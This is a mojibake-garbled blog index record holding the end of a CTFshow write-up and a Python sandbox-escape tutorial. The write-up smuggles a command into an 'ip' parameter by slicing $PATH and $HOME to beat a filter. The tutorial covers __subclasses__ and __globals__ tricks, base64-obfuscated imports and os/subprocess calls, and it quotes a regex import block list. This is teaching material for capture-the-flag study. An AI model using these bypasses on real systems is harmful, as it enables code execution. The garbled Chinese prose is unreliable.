ç™»é™†è¿›å»å‘ç°æ˜¯ä¸ªcurlçš„åŠŸèƒ½ï¼ŒçŒœæµ‹æ˜¯å‘½ä»¤æ³¨å…¥ï¼Œfuzzä¸€ä¸‹ è¿‡æ»¤äº† 1å°å†™å­—æ¯ | () &#x2F; \\ &#96; * , &lt; &gt; ! ä½†æ˜¯ è¿™äº›æ²¡è¿‡æ»¤ 1? $ &#123; &#125; : å¤§å†™å­—æ¯æ²¡è¿‡æ»¤ï¼Œè€Œä¸€äº›linuxçš„å¸¸é‡éƒ½æ˜¯å¤§å†™å­—æ¯ï¼Œå¦‚: 123$PATH linuxç¯å¢ƒå˜é‡$HOME ç”¨æˆ·ä¸»ç›®å½•$PWD å½“å‰è·¯å¾„ å¯ä»¥ç›´æ¥å¸¦å‡ºè¿™å˜é‡ 1ip&#x3D;1.1.1.1:9000?$PATH ç„¶åæˆªå–æ‹¼æ¥å°±è¡Œ 1ip&#x3D;127.0.0.1;$&#123;PATH:7:1&#125;$&#123;PATH:8:1&#125;$&#123;HOME:12:1&#125; ????.???","categories":[],"tags":[{"name":"CTFshow","slug":"CTFshow","permalink":"http://www.m00nback.xyz/tags/CTFshow/"},{"name":"wirteup","slug":"wirteup","permalink":"http://www.m00nback.xyz/tags/wirteup/"}]},{"title":"Pythonæ²™ç®±é€ƒé€¸","slug":"Pythonæ²™ç®±é€ƒé€¸","date":"2020-02-16T13:50:53.000Z","updated":"2020-06-25T05:54:16.967Z","comments":true,"path":"2020/02/16/Pythonæ²™ç®±é€ƒé€¸/","link":"","permalink":"http://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†pythonæ²™ç®±é€ƒé€¸çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†pythonæ²™ç®±é€ƒé€¸çš„ç›¸å…³å†…å®¹ï¼ æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µæ²™ç®±é€ƒé€¸ï¼Œå°±æ˜¯åœ¨ç»™æˆ‘ä»¬çš„ä¸€ä¸ªä»£ç æ‰§è¡Œç¯å¢ƒä¸‹(Ojæˆ–ä½¿ç”¨socatç”Ÿæˆçš„äº¤äº’å¼ç»ˆç«¯),è„±ç¦»ç§ç§è¿‡æ»¤å’Œé™åˆ¶,æœ€ç»ˆæˆåŠŸæ‹¿åˆ°shellæƒé™çš„è¿‡ç¨‹ã€‚ å‘½åç©ºé—´åç©ºé—´æ˜¯åç§°åˆ°å¯¹è±¡çš„æ˜ å°„ï¼›æŒ‰ç…§å˜é‡å®šä¹‰çš„ä½ç½®ï¼Œæœ‰ä»¥ä¸‹åˆ†ç±»ï¼š Localï¼Œå±€éƒ¨å‘½åç©ºé—´ï¼Œæ¯ä¸ªå‡½æ•°æ‰€æ‹¥æœ‰çš„å‘½åç©ºé—´ï¼Œè®°å½•äº†å‡½æ•°ä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡ Globalï¼Œå…¨å±€å‘½åç©ºé—´ï¼Œæ¯ä¸ªæ¨¡å—åŠ è½½æ‰§è¡Œæ—¶åˆ›å»ºçš„ï¼Œè®°å½•äº†æ¨¡å—ä¸­å®šä¹‰çš„å˜é‡ Built-inï¼Œå†…å»ºå‘½åç©ºé—´ï¼Œä»»ä½•æ¨¡å—å‡å¯è®¿é—® ä¸Šè¿°ä¸‰ç§å‘½åç©ºé—´çš„ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹ï¼š Localï¼Œåœ¨å‡½æ•°è°ƒç”¨æ—¶æ‰è¢«åˆ›å»ºï¼Œå½“å‡½æ•°è¿”å›ç»“æœæˆ–æŠ›å‡ºå¼‚å¸¸æ—¶è¢«åˆ é™¤ Globalï¼Œåœ¨æ¨¡å—åŠ è½½æ—¶è¢«åˆ›å»ºï¼Œä¸€ç›´ä¿ç•™åˆ°pythonè§£é‡Šå™¨é€€å‡º Built-inï¼Œåœ¨pythonè§£é‡Šå™¨å¯åŠ¨æ—¶åˆ›å»ºï¼Œä¸€ç›´ä¿ç•™åˆ°pythonè§£é‡Šå™¨é€€å‡º åƒlenï¼Œprintè¿™äº›å‡½æ•°ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å¼•å…¥æ¨¡å—è€Œç›´æ¥å¯ä»¥å»è°ƒç”¨ï¼Œå› æ­¤è¿™äº›å‡½æ•°éƒ½æ¥è‡ªå†…å»ºå‘½åç©ºé—´ å¸¸ç”¨çš„å†…å»ºå±æ€§__class____class__åŒtype()ï¼Œéƒ½å¯æŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»ï¼š 12345678910&gt;&gt;&gt; class Student():... def __init__(self, name):... self.name = name... &gt;&gt;&gt; stu = Student(&#x27;ling&#x27;)&gt;&gt;&gt; type(stu)&lt;class &#x27;__main__.Student&#x27;&gt;&gt;&gt;&gt; stu.__class__&lt;class &#x27;__main__.Student&#x27;&gt;&gt;&gt;&gt; __base__å¯ä»¥è·å–ç±»çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯objectï¼Œæœ‰æ—¶ä¸æ˜¯ï¼Œä¾‹å¦‚ç»§æ‰¿ç±»çš„æ—¶å€™ï¼š 1234567891011121314&gt;&gt;&gt; class Student():... def __init__(self, name):... self.name = name... &gt;&gt;&gt; stu = Student(&#x27;ling&#x27;)&gt;&gt;&gt; stu.__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; class Student2(Student):... pass... &gt;&gt;&gt; stu2 = Student2()&gt;&gt;&gt; stu2.__class__.__base__&lt;class &#x27;__main__.Student&#x27;&gt; __mro__ä»¥å…ƒç¥–çš„å½¢å¼è¿”å›æ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼š 12&gt;&gt;&gt; stu2.__class__.__mro__(&lt;class &#x27;__main__.Student2&#x27;&gt;, &lt;class &#x27;__main__.Student&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;) ä¸Šé¢æ˜¾ç¤ºäº†Student2ç»§æ‰¿è‡ªStudentï¼ŒStudentç»§æ‰¿è‡ªobjectï¼›å› æ­¤å¯ä»¥ç›´æ¥è·å–objectç±»ï¼š 12&gt;&gt;&gt; stu2.__class__.__mro__[-1]&gt;&gt;&gt; &lt;class &#x27;object&#x27;&gt; __subclasses__()ä¸Šè¿°ä¸¤ç§æ–¹æ³•å¯ä»¥å¾—åˆ°objectç±»ï¼Œä½†å¦‚æœä»£ç ä¸­æ²¡æœ‰Studentç±»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åˆ©ç”¨pythonè‡ªå¸¦çš„å¯¹è±¡(ä¸€åˆ‡çš†ä¸ºå¯¹è±¡)ï¼š 12345678&gt;&gt;&gt; [].__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;class &#x27;object&#x27;&gt; å¾—åˆ°objectç±»åï¼Œå°±å¯ä»¥ç”¨__subclasses__()æ–¹æ³•è·å¾—æ‰€æœ‰ç»§æ‰¿æ­¤ç±»çš„å­ç±»ï¼š 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;...... æ³¨ï¼šæ²¡æœ‰é™åˆ¶çš„è¯ï¼Œobjectç±»æ˜¯ç›´æ¥å¯ä»¥ä½¿ç”¨çš„ __dict__æˆ‘ä»¬åœ¨è·å¾—åˆ°ä¸€ä¸ªæ¨¡å—æ—¶æƒ³è°ƒç”¨æ¨¡å—ä¸­çš„æ–¹æ³•ï¼Œæ°å¥½è¯¥æ–¹æ³•è¢«è¿‡æ»¤äº†ï¼Œå°±å¯ä»¥ç”¨è¯¥æ–¹æ³•bypass 12345&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(&#x27;ls&#x27;)1 2&gt;&gt;&gt; os.__dict__[&#x27;s&#x27;+&#x27;ystem&#x27;](&#x27;ls&#x27;)1 2 ä¸dir()ä½œç”¨ç›¸åŒï¼Œéƒ½æ˜¯è¿”å›å±æ€§ã€æ–¹æ³•ç­‰ï¼›ä½†ä¸€äº›æ•°æ®ç±»å‹æ˜¯æ²¡æœ‰__dict__å±æ€§çš„ï¼Œå¦‚[].__dict__ä¼šè¿”å›é”™è¯¯ __dict__åªä¼šæ˜¾ç¤ºå±äºè‡ªå·±çš„å±æ€§ï¼Œdir()é™¤äº†æ˜¾ç¤ºè‡ªå·±çš„å±æ€§ï¼Œè¿˜æ˜¾ç¤ºä»çˆ¶ç±»ç»§æ‰¿æ¥çš„å±æ€§ å¯ä»¥ä½¿ç”¨__dict__æ¥é—´æ¥è°ƒç”¨ä¸€äº›å±æ€§æˆ–æ–¹æ³•ï¼Œå¦‚ï¼š 1234&gt;&gt;&gt; a = []&gt;&gt;&gt; [].__class__.__dict__[&#x27;append&#x27;](a, &#x27;ling&#x27;)&gt;&gt;&gt; a[&#x27;ling&#x27;] __init____init__ç”¨äºåˆå§‹åŒ–ç±»ï¼Œåœ¨æ²™ç›’é€ƒé€¸ä¸­çš„ä½œç”¨å°±æ˜¯ä¸ºäº†å¾—åˆ°function/methodç±»å‹ï¼š 12345678910111213141516&gt;&gt;&gt; class Base:... def __init__(self, a, b):... self.a = a... def func():... pass... &gt;&gt;&gt; class Child(Base):... pass... &gt;&gt;&gt; Child&lt;class &#x27;__main__.Child&#x27;&gt;&gt;&gt;&gt; &gt;&gt;&gt; Child.__init__&lt;function Base.__init__ at 0x7f40d32ed268&gt;&gt;&gt;&gt; Child.func&lt;function Base.func at 0x7f40d32ed2f0&gt; __globals__è¯¥å±æ€§æ˜¯å‡½æ•°/æ–¹æ³•ç‰¹æœ‰çš„å±æ€§ï¼Œè®°å½•å½“å‰æ–‡ä»¶çš„å…¨å±€å˜é‡çš„å€¼ 1234567891011121314151617181920&gt;&gt;&gt; def func():... pass... &gt;&gt;&gt; dir(func)[&#x27;__annotations__&#x27;, &#x27;__call__&#x27;, &#x27;__class__&#x27;, &#x27;__closure__&#x27;, &#x27;__code__&#x27;, &#x27;__defaults__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__get__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__globals__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__kwdefaults__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;, &#x27;__name__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__qualname__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;] &gt;&gt;&gt; class Student:... def __init__(self):... pass... &gt;&gt;&gt; stu = Student()&gt;&gt;&gt; stu.__init__&lt;bound method Student.__init__ of &lt;__main__.Student instance at 0x7fba95e03cb0&gt;&gt;&gt;&gt;&gt; stu.__init__.__globals__&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;&gt;&gt;&gt; Student.__init__.__globals__&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;&gt;&gt;&gt; Student.__init__&lt;unbound method Student.__init__&gt;&gt;&gt;&gt; æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨__base__è·å–åˆ°æ‰€æœ‰ç±»çš„çˆ¶ç±»Objectç±»ï¼Œç„¶åå†ç”¨__subclasses__()è·å–æ‰€æœ‰ç»§æ‰¿æ­¤ç±»çš„å­ç±»ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æˆåŠŸçš„åˆ©ç”¨è¿™äº›ç±»äº† å¦‚æœè¯¥å…³é”®å­—è¢«è¿‡æ»¤äº†æˆ‘ä»¬å¯ä»¥ï¼Œä»¥ä¸‹ä¸¤è€…ç­‰æ•ˆ 12__init__.__globals__[&#x27;sys&#x27;]__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;sys&#x27;] builtinsã€builtinä¸builtinså…ˆè¯´ä¸€ä¸‹ï¼Œbuiltinã€builtinsï¼Œ__builtin__ä¸__builtins__çš„åŒºåˆ«ï¼šé¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ Python ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°ä¸éœ€è¦ä»»ä½• import å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚chrã€openã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸º Python æœ‰ä¸ªå«å†…å»ºæ¨¡å—ï¼ˆæˆ–è€…å«å†…å»ºå‘½åç©ºé—´ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒæœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œå˜é‡å’Œç±»ï¼Œä¸Šé¢è¯´è¿‡ã€‚å¦å¤–ï¼ŒPython å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ç­‰çš„æŸ¥æ‰¾æ–¹å¼æ˜¯æŒ‰ LEGB è§„åˆ™æ¥æ‰¾çš„ï¼Œå…¶ä¸­ B å³ä»£è¡¨å†…å»ºæ¨¡å—ã€‚ åœ¨ 2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º __builtin__ï¼Œåˆ°äº† 3.x å°±æˆäº† builtinsã€‚å®ƒä»¬éƒ½éœ€è¦ import æ‰èƒ½æŸ¥çœ‹ï¼š 2.xï¼š 123&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; __builtin__&lt;module &#x27;__builtin__&#x27; (built-in)&gt; 3.xï¼š 123&gt;&gt;&gt; import builtins&gt;&gt;&gt; builtins&lt;module &#x27;builtins&#x27; (built-in)&gt; è€Œ__builtins__ ä¸¤è€…éƒ½æœ‰ï¼Œå®é™…ä¸Šæ˜¯__builtin__å’Œbuiltins çš„å¼•ç”¨ã€‚å®ƒä¸éœ€è¦å¯¼å…¥ï¼Œä¼°è®¡æ˜¯ä¸ºäº†ç»Ÿä¸€ 2.x å’Œ 3.xã€‚ä¸è¿‡__builtins__ä¸__builtin__å’Œbuiltinsæ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«çš„ï¼Œ__builtins__ ç›¸å¯¹å®ç”¨ä¸€ç‚¹ï¼Œå¹¶ä¸”åœ¨ __builtins__é‡Œæœ‰å¾ˆå¤šå¥½ä¸œè¥¿ï¼š 123456789&gt;&gt;&gt; &#x27;__import__&#x27; in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; &#x27;eval&#x27; in dir(__builtins__)True&gt;&gt;&gt; &#x27;execfile&#x27; in dir(__builtins__)True é‚£ä¹ˆæ—¢ç„¶__builtins__æœ‰è¿™ä¹ˆå¤šå±é™©çš„å‡½æ•°ï¼Œä¸å¦‚å°†é‡Œé¢çš„å±é™©å‡½æ•°ç ´åäº†ï¼š 1__builtins__.__dict__[&#x27;eval&#x27;] = &#x27;not allowed&#x27; æˆ–è€…ç›´æ¥åˆ äº†ï¼š 1del __builtins__.__dict__[&#x27;eval&#x27;] ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ reload(__builtins__) æ¥æ¢å¤ __builtins__ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ reload çš„æ—¶å€™ä¹Ÿæ²¡å¯¼å…¥ï¼Œè¯´æ˜reloadä¹Ÿåœ¨ __builtins__é‡Œï¼Œé‚£å¦‚æœè¿reloadéƒ½ä»__builtins__ä¸­åˆ äº†ï¼Œå°±æ²¡æ³•æ¢å¤__builtins__äº†ï¼Œéœ€è¦å¦å¯»ä»–æ³•ã€‚ è¿™é‡Œæ³¨æ„ï¼Œ2.x çš„ reload æ˜¯å†…å»ºçš„ï¼Œ3.x éœ€è¦ import impï¼Œç„¶åå† imp.reloadã€‚åŒæ ·ä¹Ÿå¯ä»¥reloadå…¶ä»–æ¨¡å—ã€‚ èŠ±å¼importå¯¹äºé˜²å¾¡è€…æ¥è¯´,æœ€åŸºç¡€çš„æ€è·¯,å°±æ˜¯å¯¹ä»£ç çš„å†…å®¹è¿›è¡Œæ£€æŸ¥æœ€å¸¸è§çš„æ–¹æ³•å‘¢,å°±æ˜¯ç¦æ­¢å¼•å…¥æ•æ„Ÿçš„åŒ…ï¼Œä¸¾ä¸ªä¾‹å­ï¼š 1234567import recode = open(&#x27;code.py&#x27;).read()pattern = re.compile(&#x27;import\\s+(os|commands|subprocess|sys)&#x27;)match = re.search(pattern,code)if match: print &quot;forbidden module import detected&quot; raise Exception ç”¨ä»¥ä¸Šçš„å‡ è¡Œä»£ç ,å°±å¯ä»¥ç®€å•çš„å®Œæˆå¯¹äºæ•æ„Ÿçš„åŒ…çš„æ£€æµ‹ æˆ‘ä»¬çŸ¥é“,è¦æ‰§è¡Œshellå‘½ä»¤,å¿…é¡»å¼•å…¥os/commands/subprocessè¿™å‡ ä¸ªåŒ…,å¯¹äºæ”»å‡»è€…æ¥è¯´,æ”¹å¦‚ä½•ç»•è¿‡å‘¢,å¿…é¡»ä½¿ç”¨å…¶ä»–çš„å¼•å…¥æ–¹å¼ importimportå¯ä»¥ç”¨æ¥å¯¼å…¥ä¸€ä¸ªåŒ…ï¼Œåœ¨æ¨¡å—å¯¼å…¥çš„æ—¶å€™ï¼Œé»˜è®¤åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾ï¼Œç„¶åå†åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾ï¼Œç³»ç»ŸæŸ¥æ‰¾çš„èŒƒå›´æ˜¯sys.pathä¸‹çš„æ‰€æœ‰è·¯å¾„ï¼š importçš„æœ¬è´¨æ˜¯ï¼šæœç´¢moduleså¹¶ç»‘å®šåˆ°å±€éƒ¨å˜é‡ import module_nameå®è´¨æ˜¯å°†module_name.pyä¸­çš„å…¨éƒ¨ä»£ç åŠ è½½åˆ°å†…å­˜å¹¶èµ‹å€¼ç»™ä¸æ¨¡å—åŒåçš„å˜é‡å†™åœ¨å½“å‰æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªå˜é‡çš„ç±»å‹æ˜¯module ç°åœ¨è®¾ç½®ä¸€ä¸‹modulesä¸­osçš„å€¼ä¸ºNoneï¼š 12345&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = None&gt;&gt;&gt; import os&gt;&gt;&gt; Traceback (most recent call last):&gt;&gt;&gt; File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;&gt;&gt;&gt; ImportError: No module named os å‘ç°æŠŠosä»modulesä¸­åˆ å»å°±ä¸èƒ½ç›´æ¥å¼•å…¥äº†ï¼›ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ¥ç€è®¾ç½®osçš„æ¨¡å—çš„è·¯å¾„ï¼Œä»è€Œå¼•å…¥è¯¥æ¨¡å—ï¼š 123&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;/usr/lib/python2.7/os.py&#x27;&gt;&gt;&gt; import os&gt;&gt;&gt; æ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½ç”¨ del sys.modules[&#39;os&#39;]ï¼Œå› ä¸ºï¼Œå½“ import ä¸€ä¸ªæ¨¡å—æ—¶ï¼šimport Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ Aã€‚ æ‰€ä»¥åˆ äº† sys.modules[&#39;os&#39;] åªä¼šè®© Python é‡æ–°åŠ è½½ä¸€æ¬¡ osã€‚ çœ‹åˆ°è¿™ä½ è‚¯å®šå‘ç°äº†ï¼Œå¯¹äºä¸Šé¢çš„è¿‡æ»¤æ–¹å¼ï¼Œç»•è¿‡çš„æ–¹å¼å¯ä»¥æ˜¯è¿™æ ·ï¼š 12345sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27; # oj ä¸ºä½ åŠ çš„del sys.modules[&#x27;os&#x27;]import osos.system(&#x27;ls&#x27;) å¦‚æœsysæ¨¡å—ä¹Ÿä¸èƒ½ç”¨ï¼Œé‚£ä¹ˆå°±ä¸èƒ½é€šè¿‡è®¾ç½®è·¯å¾„æ¥é‡æ–°å¼•å…¥æ¨¡å—äº†ï¼Œä½†å¯ä»¥ä½¿ç”¨pythonçš„å†…å»ºå‡½æ•°ï¼š execfileï¼šexecfile() å‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶(python2) execï¼šæ‰§è¡Œå­˜å‚¨åœ¨å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ä¸­çš„pythonè¯­å¥ï¼›python2çš„execæ˜¯ä¸€ä¸ªå†…ç½®è¯­å¥è€Œä¸æ˜¯å‡½æ•°ï¼›python3å°†python2ä¸­çš„execå’Œexecfile()åŠŸèƒ½æ•´åˆåˆ°ä¸€ä¸ªexec()å‡½æ•°ä¸­äº† ä¾‹å¦‚(python2)ï¼š 12&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)&gt;&gt;&gt; system(&#39;ls &#x2F;&#39;) æˆ–è€…ï¼š 12&gt;&gt;&gt; exec open(&#x27;/usr/lib/python2.7/os.py&#x27;)&gt;&gt;&gt; system(&#x27;ls /&#x27;) __import__()__import__ä½œä¸ºä¸€ä¸ªå‡½æ•°ï¼Œåªèƒ½æ¥å—å­—ç¬¦ä¸²å‚æ•°ï¼Œè¿”å›å€¼å¯ä»¥ç›´æ¥ç”¨æ¥æ“ä½œï¼›é€šå¸¸åœ¨åŠ¨æ€åŠ è½½çš„æ—¶å€™ç”¨åˆ°è¿™ä¸ªå‡½æ•° 123&gt;&gt;&gt; __import__(&#x27;re&#x27;).findall(&#x27;(hi)&#x27;, &#x27;hilinghi&#x27;)[&#x27;hi&#x27;, &#x27;hi&#x27;]&gt;&gt;&gt; importlibimportlibæ¨¡å—æ˜¯å¯¹importå’Œ__import__()çš„è¡¥å……ï¼›å®ƒä¹Ÿå¯ä»¥é€šè¿‡ä¼ å…¥å­—ç¬¦ä¸²æ¥å¼•å…¥ä¸€ä¸ªæ¨¡å— 123&gt;&gt;&gt; import importlib&gt;&gt;&gt; a = importlib.import_module(&#x27;os&#x27;)&gt;&gt;&gt; a.chdir(&#x27;../&#x27;) dir ä¸ __dict__è¿™ä¸¤ç§æ–¹æ³•éƒ½æ˜¯ä¸€ä¸ªç›®çš„,é‚£å°±æ˜¯åˆ—å‡ºä¸€ä¸ªæ¨¡ç»„/ç±»/å¯¹è±¡ ä¸‹é¢ æ‰€æœ‰çš„å±æ€§å’Œå‡½æ•°è¿™åœ¨æ²™ç›’é€ƒé€¸ä¸­æ˜¯å¾ˆæœ‰ç”¨çš„,å¯ä»¥æ‰¾åˆ°éšè—åœ¨å…¶ä¸­çš„ä¸€äº›ä¸œè¥¿ 1234&gt;&gt;&gt; A.__dict__mappingproxy(&#123;&#x27;b&#x27;: &#x27;asdas&#x27;, &#x27;__dict__&#x27;: &lt;attribute &#x27;__dict__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;a&#x27;: 1, &#x27;__doc__&#x27;: None, &#x27;__weakref__&#x27;: &lt;attribute &#x27;__weakref__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;c&#x27;: &lt;function A.c at 0x7f18ea25e510&gt;, &#x27;__module__&#x27;: &#x27;__main__&#x27;&#125;)&gt;&gt;&gt; dir(A)[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__weakref__&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;] å¸¸ç”¨çš„æ¨¡å—å’Œæ–¹æ³•æ‰§è¡Œå‘½ä»¤å’Œä»£ç osæ¨¡å—12__import__(&quot;os&quot;).system(&quot;ls&quot;)__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() platformæ¨¡å—12import platformplatform.popen(&#x27;dir&#x27;).read() subprocessæ¨¡å—1234567import subprocesssubprocess.call(&#x27;ls&#x27;,shell=True)subprocess.Popen(&#x27;ls&#x27;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()# stdin, stdout, stderrï¼š åˆ†åˆ«è¡¨ç¤ºç¨‹åºæ ‡å‡†è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯å¥æŸ„ã€‚# python3subprocess.run(&#x27;ls&#x27;,shell=True) å¦‚æœshell=Trueçš„è¯ï¼Œcurlå‘½ä»¤æ˜¯è¢«Bash(Sh)å¯åŠ¨ï¼Œæ‰€ä»¥æ”¯æŒshellè¯­æ³•ã€‚ å¦‚æœshell=Falseçš„è¯ï¼Œå¯åŠ¨çš„æ˜¯å¯æ‰§è¡Œç¨‹åºæœ¬èº«ï¼Œåé¢çš„å‚æ•°ä¸å†æ”¯æŒshellè¯­æ³•ã€‚ æ–‡ä»¶file()å‡½æ•°è¯¥å‡½æ•°åªå­˜åœ¨äºPython2ï¼ŒPython3ä¸å­˜åœ¨ 1file(&#x27;test.txt&#x27;).read() open()å‡½æ•°1open(&#x27;text.txt&#x27;).read() bypassçš„ä¸€äº›å¥—è·¯å­—ç¬¦ä¸²è¿‡æ»¤å¦‚æœæ²™ç®±å¯¹å¯¼å…¥çš„åŒ…åç§°åšäº†é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¯¼å…¥æ¨¡å—å‰å…ˆå¯¹æ¨¡å—åç§°åšå¤„ç†ï¼Œå¦‚ï¼š 123456&gt;&gt;&gt; &#x27;os&#x27;.encode(&#x27;base64&#x27;)&#x27;b3M=\\n&#x27;&gt;&gt;&gt; a = __import__(&#x27;b3M=\\n&#x27;.decode(&#x27;base64&#x27;))&gt;&gt;&gt; a.chdir(&#x27;../&#x27;)&gt;&gt;&gt; a.getcwd()&#x27;/home&#x27; ä»£ç ä¸­è¦æ˜¯å‡ºç° 